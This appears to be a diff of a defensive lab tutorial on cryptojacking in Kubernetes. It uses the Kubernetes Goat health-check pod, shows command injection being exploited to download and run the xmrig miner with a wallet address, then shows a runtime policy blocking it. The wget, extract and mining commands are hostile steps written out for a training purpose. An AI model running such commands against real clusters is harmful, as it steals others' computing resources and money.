@@ -1,4 +1,4 @@
-
+# Defend K8S Workloads from Cryptojacking Attacks
 
 Cryptojacking, the unauthorized use of someone else’s computing resources for cryptocurrency mining, is a silent but rapidly growing menace. Cryptocurrency mining steals the resources of infected machines, significantly affecting their performance and increasing the wear and tear of hardware. The mining also leads to other costs, like increased power consumption or resource consumption on the cloud.
 
@@ -11,6 +11,7 @@ To exploit the command injection vulnerability and get started with mining, star
 ```sh
 $ uname -a
 ```
+
 For the health check deployment, the OS is ubuntu.
 
 **Step 1**: Download the binary release of xmrig for linux-static from the <a href="https://github.com/xmrig/xmrig/releases", target="_blank">open source github page</a>. The attacker will use a version of the binary with the config file already populated with the required info.
@@ -18,25 +19,29 @@ For the health check deployment, the OS is ubuntu.
 ```sh
 $ wget https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-linux-static-x64.tar.gz -P /tmp
 ```
+
 After executing the above, the binary is downloaded into the container which can be confirmed by using ```ls```
 
-![](images/crypto-mining/goat-ls.png)
+![alt](images/crypto-mining/goat-ls.png)
 
 **Step 2**: Install the xmrig binary into the ```/tmp``` folder
 
 ```sh
 $ tar xvzf /tmp/xmrig-6.21.2-linux-static-x64.tar.gz -C /tmp
 ```
+
 On successful install, an output similar to below will be visible
 
-![](images/crypto-mining/xmrig-installed.png)
+![alt](images/crypto-mining/xmrig-installed.png)
 
 **Step 3**: Try running xmrig with the below command
 
 ```sh
 $ /tmp/xmrig-6.21.2/xmrig 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD
 ```
+
 Now xmrig starts to mine and here, the load becomes too high that the container gets restarted
+
 ```sh
 vagrant@demo:~/kubernetes-goat$ kubectl get pods -l app=health-check -w
 NAME                                       READY   STATUS    RESTARTS        AGE
@@ -130,24 +135,25 @@ To apply the policy in SaaS,
 
 **Step 1**: To create the policy Navigate to Runtime Protection → Policies. Then select **Create Policy** option from the screen.
 
-![](images/crypto-mining/create-policy.png)
+![alt](images/crypto-mining/create-policy.png)
 
 **Step 2**: In the policy editor tool create/upload the above policy. Select the Cluster, namespace, **Save** and then select **Save to workspace** option.
 
-![](images/crypto-mining/save-policy.png)
+![alt](images/crypto-mining/save-policy.png)
 
 **Step 3**: Apply the policy by clicking on the three dots next to the saved policy and selecting **Apply Policy**.
 
-![](images/crypto-mining/apply-policy.png)
+![alt](images/crypto-mining/apply-policy.png)
 
 **Step 4**: The policy is applied successfully. Now, try to execute xmrig again
 
 ```sh
 $ /tmp/xmrig-6.21.2/xmrig 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD
 ```
+
 Exit status 126 is shown as xmrig is not allowed to be executed
 
-![](images/crypto-mining/xmrig-exit.png)
+![alt](images/crypto-mining/xmrig-exit.png)
 
 Alerts are generated for the execution attempt:
 
